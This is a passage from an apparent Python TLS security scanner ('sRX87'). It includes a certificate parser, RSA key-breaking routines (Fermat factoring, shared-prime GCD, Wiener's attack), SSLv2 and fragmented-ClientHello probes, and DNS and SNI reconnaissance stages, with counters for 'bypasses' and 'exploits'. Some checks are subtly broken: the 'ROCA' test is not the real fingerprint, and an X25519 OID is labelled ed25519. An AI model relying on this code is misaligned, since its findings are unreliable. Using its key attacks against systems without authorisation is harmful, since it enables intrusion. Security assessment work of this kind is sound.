                        _, uri = rr2.read_tag(0x86)
                        out.append(uri.decode("ascii", "replace"))
                    else:
                        rr2.read_tag()
            elif t == 0x86:
                out.append(v.decode("ascii", "replace"))
    except Exception:
        pass
    return out


class X509Lite:
    def __init__(self, der):
        self.der = der
        self.version = 1
        self.serial = 0
        self.issuer_raw = b""
        self.valid_from = None
        self.valid_to = None
        self.subject_raw = b""
        self.subject_pubkey = None
        self.rsa_n = None
        self.rsa_e = None
        self.ec_point = None
        self.ec_curve_oid = b""
        self.pubkey_size_bits = 0
        self.san_dns = []
        self.san_ip = []
        self.key_usage = []
        self.ext_key_usage = []
        self.basic_constraints_ca = False
        self.path_len = None
        self.aia_urls = []
        self.crl_urls = []
        self.ocsp_urls = []
        self.sct_present = False
        self.must_staple = False
        self.sig_hash = ""
        self.parse()

    def parse(self):
        try:
            outer = DERReader(self.der)
            _, tbs_wrap = outer.read_tag(0x30)
            outer_r = DERReader(tbs_wrap)
            _, tbs = outer_r.read_tag(0x30)
            self._parse_tbs(tbs)
        except Exception:
            pass

    def _parse_tbs(self, tbs):
        r = DERReader(tbs)
        if r.peek_tag() == 0xa0:
            _, verw = r.read_tag(0xa0)
            vr = DERReader(verw)
            _, vi = vr.read_tag(0x02)
            self.version = int.from_bytes(vi, "big") + 1
        try:
            _, ser = r.read_tag(0x02)
            self.serial = int.from_bytes(ser, "big")
        except Exception:
            pass
        try:
            _, sig_alg = r.read_tag(0x30)
            ar = DERReader(sig_alg)
            _, oid = ar.read_tag(0x06)
            self.sig_hash = _sig_oid_name(oid)
        except Exception:
            pass
        try:
            _, issuer = r.read_tag(0x30)
            self.issuer_raw = issuer
        except Exception:
            pass
        try:
            _, validity = r.read_tag(0x30)
            vr = DERReader(validity)
            _, from_v = vr.read_tag()
            _, to_v = vr.read_tag()
            self.valid_from = _parse_time(from_v)
            self.valid_to = _parse_time(to_v)
        except Exception:
            pass
        try:
            _, subject = r.read_tag(0x30)
            self.subject_raw = subject
        except Exception:
            pass
        try:
            _, spki = r.read_tag(0x30)
            self._parse_spki(spki)
        except Exception:
            pass
        while r.remaining() > 0:
            try:
                if r.peek_tag() in (0xa1, 0xa2, 0xa3):
                    _, extw = r.read_tag()
                    er = DERReader(extw)
                    if er.peek_tag() == 0x30:
                        _, extseq = er.read_tag(0x30)
                        self._parse_extensions(extseq)
                    else:
                        break
                else:
                    break
            except Exception:
                break

    def _parse_spki(self, spki):
        r = DERReader(spki)
        _, alg_seq = r.read_tag(0x30)
        ar = DERReader(alg_seq)
        _, oid = ar.read_tag(0x06)
        _, bitstr = r.read_tag(0x03)
        key_body = bitstr[1:] if bitstr and bitstr[0] == 0x00 else bitstr
        try:
            kr = DERReader(key_body)
            _, keys = kr.read_tag(0x30)
            if oid == b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01":
                rr = DERReader(keys)
                _, n_b = rr.read_tag(0x02)
                _, e_b = rr.read_tag(0x02)
                self.rsa_n = int.from_bytes(n_b, "big")
                self.rsa_e = int.from_bytes(e_b, "big")
                self.pubkey_size_bits = self.rsa_n.bit_length()
                self.subject_pubkey = {"type": "rsa", "n": self.rsa_n, "e": self.rsa_e}
            elif oid == b"\x2a\x86\x48\xce\x3d\x02\x01":
                ee = DERReader(keys)
                _, curve_oid = ee.read_tag(0x06)
                self.ec_curve_oid = curve_oid
                _, point = ee.read_tag(0x03)
                pt = point[1:] if point and point[0] == 0x00 else point
                self.ec_point = pt
                self.pubkey_size_bits = _ec_curve_bits(curve_oid)
                self.subject_pubkey = {"type": "ec", "curve_oid": curve_oid.hex(),
                                        "point": pt.hex(),
                                        "bits": self.pubkey_size_bits}
            elif oid == b"\x2b\x65\x6e":
                self.pubkey_size_bits = 255
                self.subject_pubkey = {"type": "ed25519"}
        except Exception:
            pass

    def _parse_extensions(self, data):
        r = DERReader(data)
        while r.remaining() > 0:
            try:
                _, ext = r.read_tag(0x30)
                er = DERReader(ext)
                _, oid = er.read_tag(0x06)
                val = b""
                if er.remaining() > 0 and er.peek_tag() == 0x01:
                    er.read_tag(0x01)
                if er.remaining() > 0:
                    _, val = er.read_tag()
                self._handle_ext(oid, val)
            except Exception:
                break

    def _handle_ext(self, oid, val):
        try:
            if oid == b"\x55\x1d\x11":
                self._parse_san(val)
            elif oid == b"\x55\x1d\x0f":
                self.key_usage = _parse_key_usage(val)
            elif oid == b"\x55\x1d\x13":
                self._parse_basic_constraints(val)
            elif oid == b"\x55\x1d\x25":
                self.ext_key_usage = _parse_eku(val)
            elif oid == b"\x55\x1d\x1f":
                self.crl_urls = _parse_dp_or_aia(val)
            elif oid == b"\x2b\x06\x01\x05\x05\x07\x01\x01":
                self.aia_urls = _parse_dp_or_aia(val)
                for u in self.aia_urls:
                    if "ocsp" in u.lower():
                        self.ocsp_urls.append(u)
            elif oid == b"\x2b\x06\x01\x05\x05\x07\x01\x18":
                self.sct_present = True
            elif oid == b"\x2b\x06\x01\x05\x05\x07\x01\x24":
                self.must_staple = True
        except Exception:
            pass

    def _parse_san(self, val):
        try:
            r = DERReader(val)
            _, seq = r.read_tag(0x30)
            sr = DERReader(seq)
            while sr.remaining() > 0:
                t, v = sr.read_tag()
                if t == 0x82:
                    self.san_dns.append(v.decode("ascii", "replace"))
                elif t == 0x87 and len(v) in (4, 16):
                    try:
                        self.san_ip.append(str(ipaddress.ip_address(v)))
                    except Exception:
                        pass
        except Exception:
            pass

    def _parse_basic_constraints(self, val):
        try:
            r = DERReader(val)
            _, seq = r.read_tag(0x30)
            sr = DERReader(seq)
            if sr.remaining() > 0 and sr.peek_tag() == 0x01:
                _, b = sr.read_tag(0x01)
                self.basic_constraints_ca = b != b"\x00"
            if sr.remaining() > 0 and sr.peek_tag() == 0x02:
                _, p = sr.read_tag(0x02)
                self.path_len = int.from_bytes(p, "big")
        except Exception:
            pass

    def subject_cn(self):
        for k, v in _parse_x509_name(self.subject_raw):
            if k == "CN":
                return v
        return ""

    def issuer_cn(self):
        for k, v in _parse_x509_name(self.issuer_raw):
            if k == "CN":
                return v
        return ""

    def subject_all(self):
        return _parse_x509_name(self.subject_raw)

    def is_self_signed(self):
        return self.subject_raw == self.issuer_raw

    def days_until_expiry(self):
        if self.valid_to is None:
            return None
        return (self.valid_to - datetime.now(timezone.utc)).days


def parse_der_certificate(der):
    try:
        return X509Lite(der)
    except Exception:
        return None


def verify_rsa_signature(n, e, sig, data, hash_name="sha256"):
    if not _HAS_CRYPTO:
        return False
    try:
        key = RSA.construct((n, e))
        hname = {"sha1": SHA1, "sha224": SHA224, "sha256": SHA256,
                 "sha384": SHA384, "sha512": SHA512}.get(hash_name, SHA256)
        h = hname.new(data)
        pkcs1_15.new(key).verify(h, sig)
        return True
    except Exception:
        return False


def rsa_factor_near_pq(n, max_iter=500000):
    a = math.isqrt(n)
    if a * a < n:
        a += 1
    for _ in range(max_iter):
        b2 = a * a - n
        b = math.isqrt(b2)
        if b * b == b2:
            return a - b, a + b
        a += 1
    return None


def rsa_shared_prime(n1, n2):
    g = GCD(n1, n2)
    if 1 < g < n1 and 1 < g < n2:
        return g
    return None


def rsa_wiener(e, n, max_iters=100000):
    def cont_frac(a, b):
        while b:
            q = a // b
            yield q
            a, b = b, a - q * b
    cf = list(cont_frac(e, n))
    p0, p1 = 0, 1
    q0, q1 = 1, 0
    for k in cf:
        p = k * p1 + p0
        q = k * q1 + q0
        p0, p1 = p1, p
        q0, q1 = q1, q
        if p == 0 or q == 0:
            continue
        if (e * q - 1) % p != 0:
            continue
        phi = (e * q - 1) // p
        s = n - phi + 1
        disc = s * s - 4 * n
        if disc < 0:
            continue
        sq = math.isqrt(disc)
        if sq * sq != disc:
            continue
        return q
    return None


def roca_fingerprint_check(n):
    try:
        if n.bit_length() < 512:
            return False
        primes = [3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97]
        M = 1
        for p in primes:
            M *= p
        return (n % M) == 1 or (n % M) == (M - 1)
    except Exception:
        return False


def dh_small_subgroup_check(p, g):
    try:
        if p <= 2:
            return True
        for q in (2, 3, 5, 7, 11, 13, 17, 19, 23):
            if pow(g, (p - 1) // q, p) == 1:
                return True
    except Exception:
        return False
    return False


def is_probable_prime(n, rounds=16):
    if _HAS_CRYPTO:
        try:
            return bool(isPrime(n, randfunc=get_random_bytes))
        except Exception:
            pass
    if n < 2:
        return False
    for p in (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37):
        if n % p == 0:
            return n == p
    d = n - 1
    r = 0
    while d % 2 == 0:
        d //= 2
        r += 1
    for _ in range(rounds):
        a = random.randrange(2, n - 1)
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = (x * x) % n
            if x == n - 1:
                break
        else:
            return False
    return True


def entropy_shannon(data):
    if not data:
        return 0.0
    c = _StdCounter(data)
    n = len(data)
    h = 0.0
    for v in c.values():
        p = v / n
        h -= p * math.log2(p)
    return h


def compute_ja3(version, cipher_ids, ext_ids, groups, ec_formats):
    s = ",".join([
        str(version),
        "-".join(str(c) for c in cipher_ids),
        "-".join(str(e) for e in ext_ids),
        "-".join(str(g) for g in groups),
        "-".join(str(p) for p in ec_formats),
    ])
    return hashlib.md5(s.encode()).hexdigest(), s


def build_ssl2_client_hello(cipher_specs=None, session_id=b"", challenge=None):
    if challenge is None:
        challenge = rand_bytes(16)
    if not cipher_specs:
        cipher_specs = [0x010080, 0x020080, 0x030080, 0x040080, 0x050080]
    body = pack_u16(0x0002)
    body += pack_u16(len(cipher_specs))
    body += pack_u16(len(session_id))
    body += pack_u16(len(challenge))
    for cs in cipher_specs:
        body += pack_u24(cs)
    body += session_id + challenge
    msg_len = len(body)
    hdr = pack_u16(0x8000 | msg_len) + pack_u8(0x01)
    return hdr + body


def parse_ssl2_server_hello(data):
    if len(data) < 11 or data[0] & 0x80 == 0:
        return None
    if data[2] != 0x04:
        return None
    return {
        "session_id_hit": data[3],
        "cert_type": data[4],
        "version": unpack_u16(data, 5),
        "cert_len": unpack_u16(data, 7),
        "cipher_len": unpack_u16(data, 9),
    }


def measure_rtt(host, port, samples=5, timeout=3.0):
    out = {"samples": [], "median_ms": None, "min_ms": None,
           "max_ms": None, "stdev_ms": None, "errors": 0}
    for _ in range(samples):
        t0 = time.time()
        s, _, err = connect_tcp(host, port, timeout=timeout)
        dt = (time.time() - t0) * 1000.0
        if s is None:
            out["errors"] += 1
            continue
        out["samples"].append(dt)
        try:
            s.close()
        except Exception:
            pass
    if out["samples"]:
        out["median_ms"] = round(statistics.median(out["samples"]), 3)
        out["min_ms"] = round(min(out["samples"]), 3)
        out["max_ms"] = round(max(out["samples"]), 3)
        out["stdev_ms"] = (round(statistics.pstdev(out["samples"]), 3)
                           if len(out["samples"]) > 1 else 0.0)
    return out


def _current_target():
    host = KB.get("meta.host")
    port = KB.get("meta.port")
    if not host:
        raise RuntimeError("no target set")
    t = Target.__new__(Target)
    t.raw = KB.get("meta.target_raw", "")
    t.scheme = KB.get("meta.scheme", "tcp")
    t.host = host
    t.port = port
    t.path = KB.get("meta.path", "/") or "/"
    t.query = KB.get("meta.query", "") or ""
    return t


def _current_host_header():
    host = KB.get("meta.host", "")
    port = KB.get("meta.port", 443)
    if port and port not in (80, 443):
        return "%s:%d" % (host, port)
    return host


STAGES = []


def register_stage(stage):
    STAGES[:] = [s for s in STAGES if s.index != stage.index]
    STAGES.append(stage)
    STAGES.sort(key=lambda s: s.index)


class TestRunner:
    def __init__(self, screen, width=None):
        self.scr = screen
        self.width = width

    def _w(self):
        return self.width or max(60, self.scr.w - 2)

    def run(self, spec, kb, stage, idx, total):
        w = self._w()
        header = "%02d/%02d · %s" % (idx, total, spec.name)
        self.scr.print_many(Panel.render(header, [
            "  " + MUTED + GLYPH_ARROW + A.RESET + " " + VALUE + spec.title + A.RESET,
            "  " + MUTED + "executing…" + A.RESET,
        ], w, colour=WARN, status="RUNNING", sc=WARN, glyph=GLYPH_CLOCK))
        self._refresh_footer()
        t0 = time.time()
        lines = []
        evidence = {}
        error = ""

        def _emit(line):
            lines.append(line)

        def _set(k, v):
            evidence[k] = v
            kb.set(k, v, stage=stage, test=spec.name)

        try:
            spec.fn(_emit, _set, kb)
            status = "OK"
            sc = OK
            glyph = GLYPH_CHECK
        except KeyboardInterrupt:
            raise
        except TimeoutError as e:
            status = "FAIL"
            sc = DANGER
            glyph = GLYPH_CROSS
            error = "timeout: %s" % e
            lines.append(DANGER + "error → timeout: " + str(e) + A.RESET)
        except Exception as e:
            status = "FAIL"
            sc = DANGER
            glyph = GLYPH_CROSS
            tb = traceback.format_exc().splitlines()
            error = "%s: %s" % (type(e).__name__, e)
            lines.append(DANGER + "error → " + error + A.RESET)
            for tl in tb[-3:]:
                lines.append(MUTED2 + "  " + tl.strip() + A.RESET)
        elapsed = time.time() - t0
        if not lines and status == "OK":
            lines.append(MUTED + "no output" + A.RESET)
        self.scr.print_many(Panel.render(header, lines, w, colour=BRAND,
                                          status="%s · %.2fs" % (status, elapsed),
                                          sc=sc, glyph=glyph))
        self.scr.print("")
        return TestResult(spec.name, status, elapsed, lines, evidence, error)

    def _refresh_footer(self):
        self.scr.set_footer(
            left=" " + MUTED +
                 "conn %d │ vulns %d │ bypass %d │ exploit %d │ [↑↓ g G] Ctrl+C %s" % (
                     count_get("connections"), count_get("vulns"),
                     count_get("bypasses"), count_get("exploits"), GLYPH_CTRL) + A.RESET,
            right=BRAND + "sRX87" + A.RESET + " ",
        )


class StageOrchestrator:
    def __init__(self, screen, kb):
        self.scr = screen
        self.kb = kb
        self.stages = []
        self.results = []
        self._t0 = time.time()

    def register(self, stage):
        self.stages.append(stage)

    def _elapsed(self):
        return human_dur(time.time() - self._t0)

    def _run_stage(self, stage):
        w = max(60, self.scr.w - 2)
        sr = StageResult(stage.index, stage.name, stage.title)
        sr.started = time.time()
        self.scr.set_header(
            left=" " + BRAND + "sRX87" + A.RESET + " " + MUTED + GLYPH_DOT + A.RESET + " " +
                 VALUE + self.kb.get("meta.target", "?") + A.RESET + " " + MUTED +
                 GLYPH_DOT + A.RESET + " " +
                 LABEL + "stage %02d/12" % stage.index + A.RESET + " " + MUTED +
                 GLYPH_DOT + A.RESET + " " +
                 ACCENT + stage.title + A.RESET,
            right=BRAND + self._elapsed() + A.RESET + " ",
        )
        self.scr.print_many(Panel.banner(
            "STAGE %02d · %s" % (stage.index, stage.title.upper()),
            "%d tests · est %s" % (len(stage.tests), human_dur(stage.estimated_seconds)),
            w, colour=ACCENT, glyph=GLYPH_STAR))
        self.scr.print("  " + MUTED + stage.description + A.RESET)
        self.scr.print("")
        runner = TestRunner(self.scr, width=w)
        for i, ts in enumerate(stage.tests, start=1):
            if ABORT.is_set():
                break
            res = runner.run(ts, self.kb, stage=stage.name, idx=i, total=len(stage.tests))
            sr.tests.append(res)
        sr.finished = time.time()
        passed = sum(1 for r in sr.tests if r.status == "OK")
        failed = sum(1 for r in sr.tests if r.status == "FAIL")
        ev = len(self.kb.prefix_entries("stage%02d." % stage.index))
        self.scr.print_many(Panel.render(
            "STAGE %02d COMPLETE · %s" % (stage.index, stage.title),
            [Panel.metric("tests", "%d/%d" % (passed, len(sr.tests)), "passed", w),
             Panel.metric("failures", str(failed), "", w, 4, 20,
                          OK if failed == 0 else DANGER),
             Panel.metric("elapsed", "%.2fs" % (sr.finished - sr.started), "", w, 4, 20, BRAND),
             Panel.metric("evidence", str(ev), "kb keys", w, 4, 20, ACCENT)],
            w, colour=OK if failed == 0 else WARN,
            status="%d/%d" % (passed, len(sr.tests)),
            sc=OK if failed == 0 else WARN,
            glyph=GLYPH_CHECK if failed == 0 else GLYPH_WARN))
        self.scr.print("")
        self.results.append(sr)

    def run_all(self):
        for stage in self.stages:
            if ABORT.is_set():
                break
            try:
                self._run_stage(stage)
            except KeyboardInterrupt:
                ABORT.set()
                break
            except Exception as e:
                w = max(60, self.scr.w - 2)
                self.scr.print_many(Panel.render(
                    "STAGE %02d CRASHED" % stage.index,
                    [DANGER + "error → %s: %s" % (type(e).__name__, e) + A.RESET],
                    w, colour=DANGER, status="CRASH", sc=DANGER, glyph=GLYPH_CROSS))
        w = max(60, self.scr.w - 2)
        total = sum(len(r.tests) for r in self.results)
        passed = sum(1 for r in self.results for t in r.tests if t.status == "OK")
        failed = total - passed
        self.scr.print_many(Panel.banner("RUN COMPLETE", "all stages finished", w))
        self.scr.print_many(Panel.render("SUMMARY", [
            Panel.metric("stages", "%d/%d" % (len(self.results), len(self.stages)), "", w),
            Panel.metric("tests", "%d/%d" % (passed, total), "", w),
            Panel.metric("failures", str(failed), "", w, 4, 20,
                          OK if failed == 0 else DANGER),
            Panel.metric("elapsed", self._elapsed(), "", w, 4, 20, BRAND),
            Panel.metric("kb keys", str(len(KB.keys())), "", w, 4, 20, ACCENT),
        ], w, colour=BRAND, status="done", sc=OK, glyph=GLYPH_STAR))
        self.scr.print("")
        self.scr.print("  " + MUTED + "Ctrl+C or q to exit" + A.RESET)


def _stage01_tcp_connect(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "opening TCP socket to %s:%d" % (target.host, target.port))
    s, dt, err = connect_tcp(target.host, target.port, timeout=4.0)
    if s is None:
        setk("stage01.tcp.connect.ok", False)
        emit_alert(emit, "error", "connect error: " + err)
        raise TimeoutError(err)
    try:
        local = s.getsockname()
        remote = s.getpeername()
    except Exception:
        local, remote = ("?",), ("?",)
    setk("stage01.tcp.connect.ok", True)
    setk("stage01.tcp.connect.rtt_ms", round(dt * 1000.0, 3))
    setk("stage01.tcp.connect.local",
         "%s:%d" % (local[0], local[1]) if len(local) >= 2 else str(local))
    setk("stage01.tcp.connect.remote",
         "%s:%d" % (remote[0], remote[1]) if len(remote) >= 2 else str(remote))
    emit_kv(emit, "connected", "yes", OK)
    emit_kv(emit, "local", "%s:%d" % (local[0], local[1]) if len(local) >= 2 else str(local))
    emit_kv(emit, "remote", "%s:%d" % (remote[0], remote[1]) if len(remote) >= 2 else str(remote))
    emit_kv(emit, "connect_rtt_ms", "%.3f" % (dt * 1000.0), BRAND)
    try:
        s.close()
    except Exception:
        pass


def _stage01_banner(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "reading up to 512 bytes with 2.0s idle timeout")
    data, dt, err = detect_service_banner(target.host, target.port, timeout=2.0)
    if err:
        emit_alert(emit, "warn", "banner read failed: " + err)
        setk("stage01.banner.present", False)
        return
    if not data:
        emit_alert(emit, "info", "no banner (TLS-first service — expected for :443)")
        setk("stage01.banner.present", False)
        setk("stage01.banner.length", 0)
        return
    setk("stage01.banner.present", True)
    setk("stage01.banner.length", len(data))
    setk("stage01.banner.text", safe_ascii(data, 200))
    setk("stage01.banner.hex", data[:64].hex())
    emit_kv(emit, "banner_length", str(len(data)), BRAND)
    emit_kv(emit, "ascii_preview", safe_ascii(data, 120))
    emit_hex(emit, "raw_bytes", data, 48, 3)


def _stage01_udp(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "UDP reachability probe with 16 random bytes")
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2.0)
        count("connections")
        try:
            s.sendto(rand_bytes(16), (target.host, target.port))
        except Exception as e:
            setk("stage01.udp.send_ok", False)
            emit_alert(emit, "warn", "UDP send failed: " + str(e))
            return
        setk("stage01.udp.send_ok", True)
        try:
            data, addr = s.recvfrom(2048)
            setk("stage01.udp.response", True)
            setk("stage01.udp.response_bytes", len(data))
            emit_kv(emit, "response", "yes", OK)
            emit_hex(emit, "response_bytes", data, 48, 3)
        except socket.timeout:
            setk("stage01.udp.response", False)
            emit_alert(emit, "info", "no UDP response (expected for non-UDP services)")
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _stage01_dns_a(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "resolving A records for %s" % target.host)
    recs = resolve_a(target.host)
    if not recs:
        emit_alert(emit, "warn", "no A records resolved")
        setk("stage01.dns.a.count", 0)
        return
    setk("stage01.dns.a.count", len(recs))
    setk("stage01.dns.a.records", recs)
    emit_kv(emit, "records", str(len(recs)), BRAND)
    for i, r in enumerate(recs[:8]):
        emit_line(emit, "  %s  %s" % (GLYPH_BULLET, r), VALUE)
        setk("stage01.dns.a.%d" % i, r)


def _stage01_dns_aaaa(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "resolving AAAA records for %s" % target.host)
    recs = resolve_aaaa(target.host)
    if not recs:
        emit_alert(emit, "info", "no AAAA records (IPv6 not advertised)")
        setk("stage01.dns.aaaa.count", 0)
        return
    setk("stage01.dns.aaaa.count", len(recs))
    setk("stage01.dns.aaaa.records", recs)
    emit_kv(emit, "records", str(len(recs)), BRAND)
    for r in recs[:6]:
        emit_line(emit, "  %s  %s" % (GLYPH_BULLET, r), VALUE)


def _stage01_dns_cname(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "resolving CNAME chain for %s" % target.host)
    recs = resolve_cname(target.host)
    if not recs:
        emit_alert(emit, "info", "no CNAME records (A/AAAA direct)")
        setk("stage01.dns.cname.count", 0)
        return
    setk("stage01.dns.cname.count", len(recs))
    setk("stage01.dns.cname.chain", [target.host] + recs)
    emit_kv(emit, "chain", " → ".join([target.host] + recs), BRAND)


def _stage01_dns_https(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "querying HTTPS RR (SVCB) for %s" % target.host)
    if not _HAS_DNS:
        emit_alert(emit, "skip", "dnspython missing")
        setk("stage01.dns.https_rr.skipped", True)
        return
    try:
        res = dns.resolver.Resolver()
        res.timeout = 4.0
        res.lifetime = 4.0
        ans = res.resolve(target.host, "HTTPS")
        vals = [str(a) for a in ans]
        if not vals:
            emit_alert(emit, "info", "no HTTPS RR published")
            setk("stage01.dns.https_rr.count", 0)
            return
        setk("stage01.dns.https_rr.count", len(vals))
        emit_kv(emit, "records", str(len(vals)), BRAND)
        has_ech = any("ech" in v.lower() for v in vals)
        setk("stage01.dns.https_rr.ech_advertised", has_ech)
        if has_ech:
            emit_alert(emit, "ok", "ECH config advertised (encrypted ClientHello possible)")
        else:
            emit_alert(emit, "info", "ECH not advertised")
    except Exception as e:
        setk("stage01.dns.https_rr.error", str(e)[:120])
        emit_alert(emit, "info", "no HTTPS RR")


def _stage01_tls_version(emit, setk, kb, version, label, tls13=False):
    target = _current_target()
    emit_header(emit, "sending %s ClientHello" % label)
    ciphers = DEFAULT_TLS13_CIPHERS if tls13 else DEFAULT_TLS12_CIPHERS
    r = tls_probe(target.host, target.port, version, ciphers, timeout=4.0,
                   sni=target.host, tls13=tls13)
    sk = "stage01.tls.%s" % label.lower().replace(" ", "").replace(".", "")
    sh = r.get("server_hello")
    if sh:
        setk(sk + ".ok", True)
        setk(sk + ".selected_cipher", sh.cipher_suite)
        setk(sk + ".selected_cipher_name", cipher_name(sh.cipher_suite))
        setk(sk + ".selected_version", sh.version)
        setk(sk + ".selected_version_name", version_name(sh.version))
        setk(sk + ".extensions_count", len(sh.extensions))
        emit_kv(emit, "handshake", "accepted", OK)
        emit_kv(emit, "negotiated_version", version_name(sh.version), VALUE)
        emit_kv(emit, "cipher_suite",
                 "0x%04x  %s" % (sh.cipher_suite, cipher_name(sh.cipher_suite)), BRAND)
        emit_kv(emit, "compression", compression_name(sh.compression))
        emit_kv(emit, "extensions", str(len(sh.extensions)))
    else:
        setk(sk + ".ok", False)
        alerts = r.get("alerts", [])
        if alerts:
            setk(sk + ".alert", alerts[0])
            emit_kv(emit, "handshake", "rejected", WARN)
            emit_kv(emit, "alert", alerts[0][2], WARN)
        else:
            emit_kv(emit, "handshake", "no response", WARN)
            if r.get("error"):
                emit_kv(emit, "error", r["error"], DANGER)


def _stage01_serverhello(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "parsing ServerHello fields")
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=target.host)
    sh = r.get("server_hello")
    if not sh:
        emit_alert(emit, "error", "no ServerHello to parse")
        setk("stage01.serverhello.ok", False)
        return
    setk("stage01.serverhello.ok", True)
    setk("stage01.serverhello.version", sh.version)
    setk("stage01.serverhello.version_name", version_name(sh.version))
    setk("stage01.serverhello.session_id_len", len(sh.session_id))
    setk("stage01.serverhello.session_id_hex", sh.session_id.hex())
    setk("stage01.serverhello.cipher", sh.cipher_suite)
    setk("stage01.serverhello.cipher_name", cipher_name(sh.cipher_suite))
    setk("stage01.serverhello.compression", sh.compression)
    setk("stage01.serverhello.ext_count", len(sh.extensions))
    emit_kv(emit, "version", "%s (0x%04x)" % (version_name(sh.version), sh.version), BRAND)
    emit_kv(emit, "random_length", str(len(sh.random)))
    emit_kv(emit, "session_id_length", str(len(sh.session_id)))
    if sh.session_id:
        emit_hex(emit, "session_id", sh.session_id, 32, 2)
    emit_kv(emit, "cipher_suite",
             "0x%04x  %s" % (sh.cipher_suite, cipher_name(sh.cipher_suite)), VALUE)
    emit_kv(emit, "compression_method",
             "%d (%s)" % (sh.compression, compression_name(sh.compression)))
    emit_kv(emit, "extensions_count", str(len(sh.extensions)))
    try:
        ts = struct.unpack(">I", sh.random[:4])[0]
        if 1000000000 < ts < 2000000000:
            dt = datetime.fromtimestamp(ts, tz=timezone.utc)
            emit_kv(emit, "random_as_time", dt.isoformat(), BRAND)
            setk("stage01.serverhello.random_is_timestamp", True)
        else:
            setk("stage01.serverhello.random_is_timestamp", False)
    except Exception:
        pass


def _stage01_extensions(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "enumerating extensions")
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=target.host)
    sh = r.get("server_hello")
    if not sh:
        emit_alert(emit, "error", "no ServerHello")
        setk("stage01.extensions.count", 0)
        return
    setk("stage01.extensions.count", len(sh.extensions))
    emit_kv(emit, "total_extensions", str(len(sh.extensions)), BRAND)
    for i, e in enumerate(sh.extensions):
        detail = ""
        if e.name == "supported_groups":
            gs = e.decoded.get("groups", [])
            detail = "%d groups: %s" % (len(gs), ", ".join(g["name"] for g in gs[:6]))
        elif e.name == "ec_point_formats":
            detail = "formats: %s" % ", ".join(str(p) for p in e.decoded.get("point_formats", []))
        elif e.name == "signature_algorithms":
            algs = e.decoded.get("algorithms", [])
            detail = "%d algs" % len(algs)
        elif e.name == "supported_versions":
            detail = "selected: %s" % (e.decoded.get("selected", "n/a"))
        elif e.name == "key_share":
            g = e.decoded.get("selected_group")
            if g:
                detail = "selected group: %s" % g["name"]
        elif e.name == "encrypted_server_name":
            detail = "ECH present (%d bytes)" % e.decoded.get("ech_bytes_len", 0)
        line = "  " + LABEL + vpad(e.name, 26) + A.RESET + " " + MUTED + \
               "(0x%04x)" % e.id + A.RESET + " " + VALUE2 + "len=%d" % len(e.data) + A.RESET
        if detail:
            line += "  " + MUTED + GLYPH_ARROW + A.RESET + " " + VALUE + detail + A.RESET
        emit(line)
        setk("stage01.extensions.%d.id" % i, e.id)
        setk("stage01.extensions.%d.name" % i, e.name)


def _stage01_sni(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "sending ClientHello with SNI=%s" % target.host)
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=target.host)
    sh = r.get("server_hello")
    if not sh:
        emit_alert(emit, "warn", "no ServerHello with SNI")
        setk("stage01.sni.ok", False)
        return
    setk("stage01.sni.ok", True)
    setk("stage01.sni.requested", target.host)
    cert = r.get("certificate")
    if cert and cert.certs:
        parsed = parse_der_certificate(cert.certs[0])
        if parsed:
            setk("stage01.sni.served_cn", parsed.subject_cn())
            emit_kv(emit, "requested_sni", target.host, VALUE)
            emit_kv(emit, "served_cn", parsed.subject_cn(), OK)
            emit_kv(emit, "certificates_returned", str(len(cert.certs)))


def _stage01_sni_omit(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "sending ClientHello with NO SNI extension")
    r = tls_probe(target.host, target.port, 0x0303, DEFAULT_TLS12_CIPHERS,
                   timeout=4.0, sni=None)
    sh = r.get("server_hello")
    if not sh:
        emit_kv(emit, "handshake", "rejected without SNI", OK)
        setk("stage01.sni_omit.rejected", True)
        return
    setk("stage01.sni_omit.rejected", False)
    cert = r.get("certificate")
    served_cn = ""
    if cert and cert.certs:
        parsed = parse_der_certificate(cert.certs[0])
        if parsed:
            served_cn = parsed.subject_cn()
    setk("stage01.sni_omit.served_cn", served_cn)
    emit_kv(emit, "handshake", "accepted without SNI", WARN)
    if served_cn:
        emit_kv(emit, "served_cn", served_cn, VALUE)
        if served_cn != target.host and not served_cn.endswith("." + target.host.rsplit(".", 1)[-1]):
            emit_alert(emit, "warn",
                       "default vhost served cert for different domain: " + served_cn)


def _stage01_record_fragment(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "sending ClientHello split into 1-byte TLS records")
    client_hello = build_client_hello(version=0x0303, cipher_ids=DEFAULT_TLS12_CIPHERS,
                                       sni=target.host, groups=DEFAULT_GROUPS,
                                       sig_algs=DEFAULT_SIG_ALGS)
    body = client_hello[5:]
    fragmented = b""
    for byte in body:
        fragmented += struct.pack(">BHH", CT_HANDSHAKE, 0x0303, 1) + bytes([byte])
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4.0)
        s.connect((target.host, target.port))
        count("connections")
        for i in range(0, len(fragmented), 1400):
            s.sendall(fragmented[i:i + 1400])
            time.sleep(0.001)
        data = b""
        end = time.time() + 4.0
        while time.time() < end:
            try:
                s.settimeout(max(0.1, end - time.time()))
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 32:
                    break
            except socket.timeout:
                break
